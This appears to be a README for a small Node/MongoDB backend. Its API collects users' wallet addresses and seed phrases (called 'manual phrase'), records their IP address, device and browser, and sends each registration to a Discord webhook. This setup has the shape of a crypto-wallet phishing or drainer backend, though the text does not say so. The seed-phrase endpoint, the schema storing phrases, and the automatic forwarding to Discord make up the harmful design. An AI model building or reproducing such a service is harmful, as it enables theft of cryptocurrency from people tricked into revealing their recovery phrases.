# X1 EcoChain Minimal Backend

Simple backend to save user wallet, manual phrase, and browser info. All registrations are sent to Discord.

## Setup

```bash
npm install
npm run dev
```

## Environment (.env)
```
MONGODB_URI=mongodb+srv://user:pass@cluster.mongodb.net/x1-ecochain
PORT=5000
NODE_ENV=development
CORS_ORIGIN=http://localhost:3000
DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_TOKEN
```

See [DISCORD_SETUP.md](DISCORD_SETUP.md) for webhook setup instructions.

## API

### Save User
**POST** `/api/user/save`

Body:
```json
{
  "walletAddress": "0x...",
  "manualPhrase": "seed phrase here"
}
```

Response:
```json
{
  "success": true,
  "message": "User saved successfully",
  "user": {
    "id": "...",
    "walletAddress": "0x...",
    "createdAt": "..."
  }
}
```

Automatically sends to Discord with:
- Wallet address
- Device type (mobile/desktop/tablet)
- Browser name & version
- IP address
- Platform info

### Get User
**GET** `/api/user/{walletAddress}`

## Database Schema

```
User:
- walletAddress (unique)
- manualPhrase 
- browserInfo:
  - userAgent
  - deviceType
  - browserName
  - browserVersion
  - ipAddress
  - platform
- createdAt
- updatedAt
```

See [SCHEMA.md](SCHEMA.md) for full schema details.
